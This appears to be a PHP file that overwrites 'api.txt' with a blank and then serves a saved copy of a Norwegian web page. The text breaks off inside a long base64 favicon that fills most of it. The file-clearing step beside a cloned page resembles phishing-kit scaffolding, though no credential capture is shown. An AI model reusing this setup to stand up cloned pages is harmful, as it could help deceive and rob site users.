﻿<?php
  $blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);


 ?>
<!DOCTYPE html><html lang="nb"><script data-savepage-type="" type="text/plain" data-savepage-src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script data-savepage-type="" type="text/plain" data-savepage-src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script data-savepage-type="" type="text/plain" data-savepage-src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
<link rel="icon" data-savepage-href="http://localhost/favicon.ico" href="data:image/x-icon;base64,AAABAAMAQEAAAAEAIAAoQgAANgAAADAwAAABACAAqCUAAF5CAAAgIAAAAQAgAKgQAAAGaAAAKAAAAEAAAACAAAAAAQAgAAAAAAAAQgAAAAAAAAAAAAAAAAAAAAAAAJSlvQCUpb0An6q5A3WPtUhDcLKDQW+1tDZrubglYbu7Nmu67DluvfA4bsDwN27B8Ddvw/A2b8PwNm/E8DZvxPA2b8XwNm/F8DZvxfA2cMXwNnDF8DZwxfA2cMXwNnDF8DZwxfA2cMXwNnDF8DZwxfA2cMXwNnDF8DZwxfA2cMXwNnDF8DZwxfA2cMXwNnDF8DZwxfA2cMXwNnDF8DZwxfA2cMXwNnDF8DZwxfA2cMXwNnDF8DZwxfA2b8XwNm/F8DZvxPA2b8TwNm/D8Ddvw/A3bsLwN27A8DhuvvA6bbrwM2m61DBourhDcbW4SXOynGKDtWCbp7gKrrO9ALC2vwCUpb0Al6e+CmCCs70lXK7/GVe0/xNWuv8WWr//GV3E/xdex/8XX8r/GGHN/xhhz/8YYtD/GWLQ/xlj0f8YY9L/GGPS/xhj0v8YY9L/GGPS/xlj0v8ZY9L/GWPS/xlj0v8ZY9L/GWPS/xlj0v8ZY9L/GWPS/xlj0v8ZY9L/GWPS/xlj0v8ZY9L/GWPS/xlj0v8ZY9L/GWPS/xlj0v8ZY9L/GWPS/xlj0v8ZY9L/GWPS/xhj0v8YY9L/GGPS/xhj0v8YY9L/GGPR/xli0f8YYtD/GGLP/xhgzf8XYMv/Fl7J/xddxf8XW8H/E1a7/xVVtf8eWK//TXSw3aavvUOyt78Af5e9AFt/tZYUUKv/FFSz/xlbvP8bX8P/G2HI/xxjzf8cZND/HWbT/x1o1v8daNj/HWjZ/x5p2v8eadr/Hmna/x5p2/8eadv/Hmnb/x5p2/8eadv/Hmna/x5p2v8eadr/Hmna/x5p2v8eadr/Hmna/x5p2v8eadr/Hmna/x5p2v8eadr/Hmna/x5p2v8eadr/Hmna/x5p2v8eadr/Hmna/x5p2v8eadr/Hmna/x5p2/8eadv/Hmnb/x5p2/8eadv/Hmna/x5p2v8eadr/HWjZ/x1o2P8dZ9b/HWbU/xxl0v8cY87/HGHK/xtfxf8ZXL3/F1e2/w1NrP9MdbHZm6nAB2+NuwssYa7mE1Kw/xpbu/8bXsP/HGLJ/xxk0P8dZ9X/HmjY/x5q2/8ea93/Hmzf/x9s4P8fbeH/H23h/x9t4f8fbeH/H23h/x9t4f8fbuL/H27i/x9u4v8fbuL/H27i/x9u4v8fbuL/H27i/x9u4v8fbuL/H27i/x9u4v8fbuL/H27i/x9u4v8fbuL/H27i/x9u4v8fbuL/H27i/x9u4v8fbuL/H27i/x9u4v8fbuL/H27i/x9t4v8fbeH/H23h/x9t4f8fbeH/H23h/x9t4P8ebN//Hmve/x5q3P8eadn/HWfW/x1l0f8cY8v/G1/E/xpcvf8WVbT/HVes/3aSvF6Dm79hH1mv/RdXtv8aXcD/G2HI/xxk0P8dZ9f/Hmrb/x5r3v8fbeH/H27j/x9v5f8fcOb/H2/n/yBw5/8gcOj/IHDo/yBw6P8gcej/IHDp/yBw6f8gcOn/IHDp/yBw6f8gcOn/IHDp/yBw6f8gcOn/IHDp/yBw6f8gcOn/IHDp/yBw6f8gcOn/IHDp/yBw6f8gcOn/IHDp/yBw6f8gcOn/IHDp/yBw6f8gcOn/IHDp/yBw6f8gcej/IHHo/yBw6P8gcOj/IHDn/x9w5/8fb+f/H3Dl/x9v5P8fbuH/H2zf/x5q3P8daNj/HWXS/xxiy/8aXsL/GVq5/xJRrv9RebWhS3a3gxxXsf8YWbr/G1/F/xxjzf8dZ9X/Hmrb/x9s3/8fbeP/H2/m/yBw6P8gcer/IHLr/yBy7P8gcu3/IHLt/yBy7f8gcu3/IHPt/yBz7f8gc+3/IHPt/yBz7f8gc+3/IHPt/yBz7f8gc+3/IHPt/yBz7v8gc+7/IHPu/yBz7v8gc+7/IHPu/yBz7v8gc+7/IHPt/yBz7f8gc+3/IHPt/yBz7f8gc+3/IHPt/yBz7f8gc+3/IHPt/yBz7f8gcu3/IHLt/yBy7f8gcuz/IHLs/yBx6v8gcOn/H3Dn/x9u5P8fbeD/Hmrc/x1o1/8cZND/G1/H/xpbvf8SUrL/Pm6zvEBus4cXVbL/Glu+/xtgyP8cZNH/HmjY/x5s3v8fbuP/IG/n/yBx6v8gcuz/IHLu/yFz7/8hdO//IXTw/yF08P8hdPH/IXTx/yF08f8hdPH/IXTx/yF08f8hdPH/IXTx/yF08f8hdPH/IXTx/yF08f8hdPH/IXTx/yF08f8hdPH/IXTx/yF08f8hdPH/IXTx/yF08f8hdPH/IXTx/yF08f8hdPH/IXTx/yF08f8hdPH/IXTx/yF08f8hdPH/IXTx/yF08P8hdPD/IXPw/yFz7/8hc+7/IHLt/yBx6v8gcOj/H27k/x9s3/8eadr/HWbT/xxhyv8aXcH/Fla2/yZesLZihLnpD1G0/xpdwf8cYsv/HWbU/x5q2/8fbeH/H3Dm/yBx6v8gc+3/IXPw/yF08f8hdfL/IXXz/yF19P8hdfT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdfT/IXX0/yF18/8hdfL/IXXy/yF08P8gc+7/IHHr/yBw5/8fbuP/Hmvd/x1n1v8cY83/G1/E/xZXuP8wY7LIV3258hBStv8bXsP/HGPN/x1n1v8ea97/H27j/yBx6f8gcuz/IXTw/yF18v8hdvP/IXb1/yF39f8hd/b/IXf2/yF39v8hd/b/IXf2/yF39v8hd/f/IXf3/yF39/8hd/f/IXf3/yF39/8hd/b/IXf2/yF39v8hd/b/IXf2/yF39v8hd/b/IXf2/yF39v8hd/b/IXf2/yF39v8hd/f/IXf3/yF39/8hd/f/IXf3/yF39/8hd/f/IXf2/yF39v8hd/b/IXf2/yF39v8hd/X/IXb1/yF29P8hdfP/IXTw/yBz7f8gcer/H2/l/x9s3/8eadn/HGXQ/xtgxv8UVrr/Pm+28E55ufASVLf/G1/F/xxkz/8daNj/Hmzf/x9v5f8gcer/IXPu/yF18f8hdvP/IXf1/yF39v8hd/f/IXf3/yF39/8iePf/Inj4/yJ4+P8iePj/Inj4/yJ4+P8iePj/Inj4/yJ4+P8iePj/Inj4/yJ4+P8iePj/Inj4/yJ4+P8iePj/Inj4/yJ4+P8iePj/Inj4/yJ4+P8iePj/Inj4/yJ4+P8iePj/Inj4/yJ4+P8iePj/Inj4/yJ4+P8iePj/Inj3/yF39/8hd/f/IXf3/yF39/8hd/X/IXb0/yF18v8hc+//IHLr/x9w5/8fbeH/Hmnb/xxl0v8bYMj/FVi8/zdrt/BIdrnwE1W5/xtfxv8cZNH/Hmna/x9t4P8fcOf/IHLr/yFz7/8hdfL/IXb1/yF39v8hd/f/Inj4/yJ4+P8iePj/H3b5/xpz+P8Wcfj/FHD5/xNv+f8Tb/n/FXD5/xhy+f8cdPn/IXf5/yJ4+f8iePn/Inj5/yJ4+f8iePn/Inj5/yJ4+f8iePn/Inj5/yJ4+f8iePn/Inj5/yJ4+f8iePn/IHf5/xx0+f8Ycvn/FnH5/xVw+f8WcPj/F3L4/xt0+P8fdvj/Inj4/yJ4+P8hd/f/IXf2/yF39f8hdfP/IXTw/yBy7f8gcOn/H27i/x5q2/8dZtP/G2HJ/xZZvf82abjwRnS58BNWuv8bYMf/HGXR/x5p2v8fbeH/H3Dn/yBy7P8hc/D/IXXy/yF39f8hd/f/Inj4/yJ4+f8gd/n/GXP5/yh8+f9Pk/r/caj7/4S0+/+Qu/v/jrr8/36w+/9movv/RI36/x52+f8bdPn/Inj5/yJ5+v8iefr/Inn6/yJ5+v8iefr/Inn6/yJ5+v8iefr/Inn6/yJ5+v8hePn/F3L5/yB3+f9Ejfr/ZaH7/3Wr+/95rPv/eKz7/2mj+/9Nkvr/LH75/xlz+f8fdvn/Inj4/yF39/8hd/X/IXb0/yF08f8gc+3/IHDp/x9u4/8eatz/HWbU/xxhyv8WWb7/NWm48ERzufATVrr/G2DH/xxl0v8eadv/H23h/yBw6P8gcu3/IXTw/yF19P8hd/b/IXf3/yJ4+P8bc/n/HHX5/2qk+//a6Pz/+vz+/////v////7////+/////v////7////+//j7/v+20v3/Por7/xdy+v8fd/r/Inn6/yJ5+v8iefr/Inn6/yJ5+v8iefr/Inn6/yJ5+v8bdfr/HHX6/1yc+//A2P3/+Pr+/////v////7////+/////v////7/+vz9/+Hs/P99r/v/JHn5/xlz+P8hd/f/IXf3/yF29P8hdPH/IHPu/yBx6f8fbuP/Hmrc/x1m1P8cYcr/Flm+/zRpuPBDc7nwE1a7/xtgyP8cZdL/Hmnb/x9t4f8gcOj/IHLt/yF08f8hdvT/IXf2/yF39/8Xcvj/Q4v6/7/Y/P////7////+/////v////7//v7+//7+/v/+/v7///7+/////v////7////+/+zz/v+LuPz/H3f6/x12+v8iefr/Inn6/yJ5+v8iefr/Inn6/yJ5+v8Vcvr/P4r7/7nU/f/+//7////+/////v////7////+/////v////7////+/////v////7////+/8/h/P9Zmvr/FnH3/x929/8hdvX/IXXx/yBz7v8gcer/H27j/x5r3f8dZtX/HGHK/xZZv/80abjwQnO58BRXu/8bYMj/HGXS/x5p2v8fbuL/IHDp/yBz7f8hdPH/IXb0/yF39v8Wcff/WZn6/+fw/f////7////+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v////7////+/7TR/f8ofPr/HXb6/yJ5+v8iefr/Inn6/yJ5+v8Wcvr/X537/+Tu/v////7////+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+/////v////3/9/r9/4Cw+v8Ycfb/H3X1/yF18v8hc+//IHHq/x9v5P8ea93/HWfV/xxiy/8WWb//M2i58EJyufAUV7v/G2DI/xxl0v8eadr/H27i/yBw6f8gc+3/IXTx/yF29P8WcPb/U5X4//D1/f////3//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+/////v////7/utX9/yJ5+v8fd/r/Inn6/yJ5+v8Wcvr/W5v8//L2/v////7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//f39/////f////z/f7D4/xdw9P8gdPL/IXPv/yBx6v8fb+T/Hmvd/x1n1f8cYsv/Flq//zNoufBCcrnwFFe7/xtgyP8cZdL/Hmna/x9u4v8gcOn/IHPt/yF08f8bcvT/NYT3/9/q+/////3//f39//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7////+/////v+dw/z/GHP6/yJ5+v8cdvr/OIf7/+bv/v////7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/9/f3///78//v8+/9em/b/FW7y/yFz7/8gcer/H2/k/x5r3f8dZ9X/HGLM/xZav/8zaLnwQnK58BRXu/8bYMj/HGXS/x5q2v8fbuL/IHDp/yBz7f8gdPH/GnH0/6HE+f////z//v79//39/f/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v////7/+fv+/1uc/P8Yc/r/G3X6/7XR/f////7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//f39//z8/P////v/2+f5/zJ/8/8cce//IHHq/x9v5f8ea93/HWfV/xxizP8WWr//M2i58EJyufAUV7v/G2DI/x1l0/8eatv/H23i/yBw6f8gc+3/GnDx/0iN9f/3+Pr///78//39/f/+/v7//v7+//7+/v/+/v7//v7+/////v////7////+/////v////7//v7+//7+/v/+/v7//v7+//7+/v////////////////+/2f7/FHD7/1SX/P/6/P////////7+/v/+/v7//v7+//7+/v/+/v7//v7+/////v////7////+/////v////7//v7+//7+/v/+/v7//v7+//39/f/8/Pz/+/v7////+f94qvT/E2vv/yBx6v8fb+X/Hmvd/x1n1f8cYsz/Flq//zNoufBBcbnwFFe7/xtgyP8dZdP/Hmrb/x9t4v8gcOn/IHPt/xRt8f94qvb////7//z8/P/9/f3//v7+//7+/v/+/v7//v7+/////v/8/f7/wdr9/5/F/P+pyvz/3ur9/////v///v7//v7+//7+/v//////////////////////7fT//yx//P+hxv7///////////////////////7+/v/+/v7//v7+/////v////7/1OX9/73X/f/N4P3/+/z+/////v/+/v7//v7+//7+/v/9/f3//f39//v7+////vn/yNr1/yN07/8dcOr/H2/l/x5r3f8dZ9X/HGLM/xZav/8yaLnwQXG58BRXu/8bYMj/HWXT/x5q2/8fbeL/IHDp/x9y7v8dcvH/tdD3////+//8/Pz//f39//7+/v/+/v7//v7+/////v/3+v7/b6f8/xp0+v8Xcvr/GHP6/yt++v+y0P3////+/////v////////////////////////////////9/sf3/xt3+/////////////////////////////v7+/////v/2+f7/fbD8/yN6+v8fd/r/H3f6/1yc/P/i7f7////+//7+/v/+/v7//f39//39/f/7+/v/+/r5//v69v9hm/D/Fmvq/x9v5f8ea93/HWfV/xxizP8WWr//Mmi58EFxufAUV7z/G2HJ/x1l0/8eatv/H23i/yBw6f8ccO7/L33y/+ju+P///vv//Pz8//39/f/+/v7//v7+/////v////7/jLn8/xNw+v8fePr/IXn6/yF5+v8cdfr/Hnf6/7fT/f//////////////////////////////////////yt/+/+vz///////////////////////////////////9/v7/gLL8/xJv+v8ed/r/IHj6/yB4+v8ScPr/W5v7//z9/v////7//v7+//39/f/9/f3/+/v7//n5+f////b/lbrx/xRp6v8fb+X/Hmvd/x1n1f8cYsz/Flq//zJoufBBcbnwFFe8/xthyf8dZdP/Hmrb/x9t4v8gcOn/G2/u/zyE8v/x8/j//vz7//z8/P/9/f3//v7+//7+/v////7/+fr+/0WO+/8bdPr/Inn6/yJ5+v8iefr/Inn6/xRx+v9kovz/////////////////////////////////////////////////////////////////////////////////2un+/yV7+v8fd/r/Inn6/yJ5+v8iefr/IXj6/xt1+v+41P3////+//7+/v/9/f3//Pz8//v7+//5+fn///32/6bE8f8Zber/Hm7l/x5r3f8dZ9X/HGLM/xZav/8yaLnwQXG58BRXvP8bYcn/HWXT/x5q3P8fbuL/IHDp/xpv7v9FivL/8vT4//38+//8/Pz//f39//7+/v/+/v7////+//H2/v8wgvr/Hnf6/yJ5+v8iefr/Inn6/yJ5+v8adPv/VJj8//3+/////////////////////////////////////////////////////////////////////////////8DY/v8gd/r/IHj6/yJ5+v8iefr/Inn6/yJ5+v8Sb/r/jbr8/////v/+/v7//f39//z8/P/7+/v/+fn5///89v+uyfL/HG7q/x5u5f8ea93/HWfV/xxizP8XW8D/MWi58EFxufAUV7z/G2HJ/x1l0/8eatz/H27j/yBw6f8ab+7/P4by//D0+P/9/Pv//Pz8//39/f/+/v7//v7+/////v/0+P7/PYr7/x12+v8iefr/Inn6/yJ5+v8iefv/HHX7/0SO/P/6/P/////////////////////////////////////////////////////////////////////////////B2f7/IXj7/yB4+v8iefr/Inn6/yJ5+v8iefr/E3D6/5C8/P////7//v7+//39/f/8/Pz/+/v7//n5+f///Pb/qcby/xtu6v8ebuX/Hmvd/x1n1f8cYsv/F1vA/zFoufBBcbnwFFe8/xthyf8dZdP/Hmrc/x9u4/8gcOn/G2/u/zmC8v/w9Pj//vz6//z8/P/9/f3//v7+//7+/v////7/+vv+/02T+/8bdfr/Inn6/yJ5+v8iefv/Inn7/yB4+/8iefv/zOD+////////////////////////////////////////////////////////////////////////////wdn+/yF4+/8gePv/Inn6/yJ5+v8iefr/Inn6/xNw+v+QvPz////+//7+/v/9/f3//Pz8//v7+//5+fn///72/5y+8f8Va+r/H27l/x5r3v8dZ9b/HGLL/xdbwP8xaLnwQXG58BRXvP8bYcn/HWXT/x5q3P8fbuP/IHHp/xxx7v8se/H/4uv4///++//8/Pz//f39//7+/v/+/v7////+/////v9oo/z/FnL6/yJ5+v8iefr/Inn7/yJ5+/8iefv/GHP7/1ub/P/4+////////////////////////////////////////////////////////////////////////8re/v8hePv/IHj7/yJ5+/8iefr/Inn6/yJ5+v8TcPr/kLz8/////v/+/v7//v7+//z8/P/7+/v/+vn5///99v93p/H/E2rq/x9v5P8ea97/HWfW/xxiy/8XW8D/MWi58EFxufAUV7z/G2HJ/x1l0/8eatz/H27j/yBx6f8fcu7/HXLx/7TQ+P////v//Pz8//39/f/+/v7//v7+///+/v////7/nMP8/xZy+v8iefr/Inn7/yJ5+/8iefv/Inn7/yJ5+/8cdfv/TZP8/467/f+oy/3/qcv9/6nL/f+py/3/qcv9/6nL/f+py/3/qcv9/6nL/f+py/3/qcv9/6rL/f+DtP3/Inn7/yF5+/8iefv/Inn6/yJ5+v8iefr/EnD6/467/P////7//v7+//7+/v/8/Pz/+/v7//79+f/b5fb/MH3w/xxv6/8fb+T/Hmve/x1n1v8cYsv/F1vA/zFoufBBcbnwFFe8/xthyf8dZdP/Hmrc/x9u4/8gcen/IHPu/xRs8f+Csfb////7//z8/P/9/f3//v7+//7+/v/+/v7////+/+/0/v87iPv/G3X6/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/xp0+/8Vcfv/GnT7/xp0+/8adPv/GnT7/xp0+/8adPv/GnT7/xp0+/8adPv/GnT7/xp0+/8adPv/HHX7/yJ5+/8iefv/Inn7/yJ5+/8iefr/Inn6/xVx+v+exPz////+//7+/v/+/v7//Pz8//z7+/////n/g7D1/xNr7/8gcev/H2/k/x5r3v8dZ9b/HGLM/xdbwP8xaLnwQXG58BRXvP8bYcn/HWXT/x5q3P8fbuP/IHHp/yBz7v8Yb/H/WZn2//38+v///vz//f39//7+/v/+/v7//v7+/////v////7/krz8/xVx+v8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yF4+/8hePv/IXj7/yF4+/8hePv/IXj7/yF4+/8hePv/IXj7/yF4+/8hePv/IXj7/yF5+/8iefv/Inn7/yJ5+/8iefv/Inn6/xlz+v8xgvr/5vD+/////v/+/v7//v7+//z8/P/+/vv/4er5/zeC8/8ccO//IHHr/x9v5P8ea97/HWfW/xxizP8XW8D/MWi58EFxufAUV7z/G2HJ/x1l0/8eatz/H27j/yBx6f8gc+7/HnPx/yx99f/c6Pr////8//39/f/+/v7//v7+//7+/v/+/v7////+//f6/v9VmPv/FnL7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yB4+v8xgfv/uNT9/////v////7//v7+//7+/v/9/fz////7/4i1+P8RbPL/IXPv/yBx6/8fb+T/Hmve/x1n1v8cYsz/F1vA/zFoufBBcbnwFFe8/xthyf8dZdP/Hmrc/x9u4/8gcen/IHPu/yF18f8Vb/T/gLD5/////P/+/v3//v7+//7+/v/+/v7//v7+//7+/v////7/3uv+/zmH+/8Xc/v/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/xl0+v9envv/5/D+/////v/+/v7//v7+//7+/v/+/v7//Pz8///++//M3vn/JXfz/x5y7/8gcev/H2/k/x5r3v8dZ9b/HGLM/xdbwP8xaLnwQXG58BRXvP8bYcn/HWXT/x5q3P8fbuP/IHHp/yBz7v8hdfH/GXH0/0aN9//4+vz////9//7+/v/+/v7//v7+//7+/v/+/v7//v7+/////v/A2f7/LoH8/xZy+/8hePv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8cdvr/PYr7/+Pt/v////7//v7+//7+/v/+/v7//v7+//z8/P/+/Pv/+/v5/1CR9P8Yb+//IHHr/x9v5P8ea97/HWfW/xxizP8XW8D/MWi58EFxufAUV7z/G2HJ/x1l0/8eatz/H27j/yBx6f8gc+7/IXXx/xVv9P9upvj//P38//7+/f/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//////9Lk/v9Slvz/F3L7/xdy+/8ed/v/IXj7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn6/xVx+v9hn/v////+/////v/+/v7//v7+//7+/v/8/Pz/+/v7////+f+EsfT/FGzv/yBx6/8fb+T/Hmve/x1n1v8cYsv/F1vA/zFoufBBcbnwFFe8/xthyf8dZdP/Hmrc/x9u4/8gcen/IHPu/x1y8f8wgPX/3un6/////P/9/f3//v7+//7+/v/+/v7//v7+//7+/v////7////+/////v///////////7DQ/v9lovz/MIH8/xp0+/8TcPv/FXH7/xVx+/8Vcfv/FXH7/xVx+/8Vcfv/FXH7/xVx+/8Vcfv/FnL7/xt1+/8hefv/Inn7/yJ5+/8iefv/Inn6/yJ5+v8gePr/HXb6/7rV/f////7//v7+//7+/v/9/f3//Pz8//v7+////vn/ytv1/yN17/8ecOv/H2/k/x5r3v8dZ9b/HGLL/xdbwP8xaLnwQXG58BRXvP8bYcn/HWXT/x5q3P8fbuP/IHDp/yBz7v8UbfH/aqL2////+//+/fz//f39//7+/v/+/v7//v7+//7+/v////7//P3+/8vf/f+00v3/tNL9/7fU/v+91/7/yN7+/+fw//+rzP7/h7b9/3it/f94rf3/eK39/3it/f94rf3/eK39/3it/f94rf3/ea79/3Gp/f9Jkfz/G3X7/yB4+/8iefv/Inn7/yJ5+v8iefr/Inn6/xZy+v9joPv////+/////v/+/v7//f39//z8/P/7+/v//Pr5//f29v9RkfD/F23q/x9v5f8ea93/HWfV/xxiy/8XW8D/MWi58EFxufAUV7z/G2HJ/x1l0/8eatz/H27i/yBw6f8fcu7/GG/x/6XG9v////v//Pz8//39/f/+/v7//v7+//7+/v////7/6/P+/2Ge/P8ed/r/HXb6/x12+v8ddvr/FXH7/1KX/P//////////////////////////////////////////////////////////////////////+fv//4W0/f8bdfv/IXj7/yJ5+v8iefr/Inn6/yJ5+v8ddvr/OIf7//L2/v////7//v7+//39/f/8/Pz/+/v7//n5+f///vb/hLDx/xNp6v8fb+X/Hmvd/x1n1f8cYsz/F1vA/zFoufBAcbnwFFi8/xthyf8dZdP/Hmrb/x9t4v8gcOn/HHDu/yx78f/h6vj///77//z8/P/9/f3//v7+//7+/v////7////+/3uv/P8Pbvr/IHj6/yF4+v8hePr/IXj6/xhz+v9Tl/z//P7/////////////////////////////////////////////////////////////////////////////can8/xhz+v8iefr/Inn6/yJ5+v8iefr/IXj6/yB4+v/B2f3////+//7+/v/9/f3//Pz8//v7+//5+fn///72/5u+8f8Wa+r/H27l/x5r3f8dZ9X/HGLM/xdav/8xaLnwQHG58BRYvP8bYcn/HWXT/x5q2/8fbeL/IHDp/xtv7v86g/L/8fP4//78+//8/Pz//f39//7+/v/+/v7////+//r7/v9Jkfv/GnT6/yJ5+v8iefr/Inn6/yJ5+v8adPr/VJf7//z9/////////////////////////////////////////////////////////////////////////////7TR/f8cdfr/IXj6/yJ5+v8iefr/Inn6/yJ5+v8Ucfr/lb/8/////v/+/v7//f39//39/f/7+/v/+fn5///89v+oxfH/Gm3q/x5u5f8ea93/HWfV/xxizP8XWr//MWi58EFxufAUV7z/G2HJ/x1l0/8eatv/H23i/yBw6f8bb+7/Qojy//Hz+P/+/Pv//Pz8//39/f/+/v7//v7+/////v/y9/7/M4P7/x53+v8iefr/Inn6/yJ5+v8iefr/GnT6/1OX+//8/f///////////////////////////////////////////////////////////////////////////v+/2f3/IXj6/yB4+v8iefr/Inn6/yJ5+v8iefr/Em/6/4y6/P////7//v7+//39/f/9/f3/+/v7//n5+f///Pb/rsnx/xtu6v8ebuX/Hmvd/x1n1f8cYsz/F1q//zFoufBBcbnwFFe7/xtgyP8dZdP/Hmrb/x9t4v8gcOn/G2/t/zyE8v/x8/j//vz7//z8/P/9/f3//v7+//7+/v////7/9vn+/z2K+/8bdfr/Inn6/yJ5+v8iefr/Inn6/xVx+v9joPv////+//////////////////////////////////////////////////////////////////7+/v////7/x939/x93+v8gePr/Inn6/yJ5+v8iefr/Inn6/xZy+v+hxvz////+//7+/v/9/f3//f39//v7+//5+fn///z2/63I8f8bbur/Hm7l/x5r3f8dZ9X/HGLM/xdav/8yaLnwQXG58BRXu/8bYMj/HWXT/x5q2/8fbeL/IHDp/xxw7f8wfvH/6vD4///9+//8/Pz//f39//7+/v/+/v7////+/////v+Bsvz/EW/6/yB4+v8hefr/IXn6/xx1+v8ddvr/tdL9/////v///v7//v7+///////////////////////S5P//8ff///////////////////7+/v/+/v7////+//D2/v9Cjfv/GHP6/yJ5+v8iefr/Inn6/xl0+v80hfr/6vL+/////v/+/v7//f39//z8/P/7+/v/+fn5///+9v+fwPH/Fmvq/x5u5f8ea93/HWfV/xxizP8WWr//Mmi58EFxufAUV7v/G2DI/xxl0v8eatv/H23i/yBw6f8fcu3/H3Px/7rT9/////v//Pz8//39/f/9/f3//v7+//7+/v////7/9Pj+/2yl/P8adPr/FnL6/xhz+v8nfPr/rcz8/////v////7//v7+//7+/v/+/v7/////////////////hLX9/9Tl/v///////v7+//7+/v/+/v7//v7+//7+/v////7/yN79/yp++v8Tcfr/F3L6/xNw+v8hePr/r879/////v////7//v7+//39/f/8/Pz/+/v7//n5+f///vb/ga7x/xNq6v8fb+X/Hmvd/x1n1f8cYsz/Flq//zJoufBBcbnwFFe7/xtgyP8cZdL/Hmna/x9u4v8gcOn/IHPt/xRs8f97rPb////7//z8/P/9/f3//f39//7+/v/+/v7//v7+/////v/8/f7/wNj9/53D/P+lyPz/2+n9/////v///v7//v7+//7+/v/+/v7//v7+//7+/v////7/7fT+/zSD+v+20/3////+//7+/v/+/v7//v7+//7+/v/+/v7//v7+/////v/Y5/3/jbr8/2Gf+/9/svz/xtz9/////v////7//v7+//7+/v/9/f3//Pz8//r6+//9/Pn/6u/2/zyE7/8bbur/H2/k/x5r3f8dZ9X/HGLM/xZav/8yZ7nwQXG58BRXu/8bYMj/HGXS/x5p2v8fbuL/IHDp/yBz7f8acfH/Q4r1//j5+////vz//f39//39/f/+/v7//v7+//7+/v/+/v7////+/////v////7////+/////v///v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7////+/7fT/f8Pbvr/c6r8/////v////7//v7+//7+/v/+/v7//v7+//7+/v/+/v7////+/////v////7////+/////v/+/v7//v7+//7+/v/9/f3//f39//z8/P/6+vr////5/5m99f8VbO//IHHq/x9v5P8ea93/HWfV/xxizP8WWr//Mme58EFxufAUV7v/G2DI/xxl0v8eadr/H27i/yBw6f8gc+3/IHTx/xty9P+qyvn////8//79/f/9/f3//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7////+//v8/v9gnvv/FHH6/yl++v/i7f7////+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7////+///+/v/+/v7//v7+//7+/v/+/v7//f39//39/f/8/Pz//fz7//r6+f9SkvP/F27v/yBx6v8fb+T/Hmvd/x1n1f8cYsv/Flq//zJnufBBcbnwFFe7/xtgyP8cZdL/Hmnb/x9u4v8gcOn/IHPt/yF08f8acfP/O4b2/+bu+/////3//f39//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7////+/////v+nyfz/GnT6/yF4+v8Yc/r/d637/////v////7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//39/f/9/f3//fz8////+/+av/f/GnDy/yBz7/8gcer/H27j/x5r3f8dZ9X/HGLL/xZav/8zaLnwQnK58BRWu/8bYMf/HGXS/x5p2/8fbeH/IHDo/yBy7f8hdPD/IXX0/xZw9f9dm/j/9vn9/////f/9/f3//f3+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7///7+/////v/I3f3/KHz6/x53+v8iefr/IXj6/xt1+v+oyvz////+/////v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//39/f/9/f3//f39/////P/J3Pr/Knv0/xxx8f8gc+7/IHHq/x9u4/8ea93/HWbV/xxhyv8WWr//M2i48EJyufAUVrr/G2DH/xxl0f8eadr/H23h/x9w5/8gcuz/IXTw/yF18/8hdvX/FXD3/2ah+f/v9fz////9//79/f/9/f3//f39//39/f/9/f3//v7+//7+/v/+/v7//v7+//7+/v/+/v7////+/////v/D2v3/MIH6/xt1+v8iefr/Inn6/yJ5+v8ed/r/Inn6/7LQ/f////7////+//7+/v/+/v7//v7+//7+/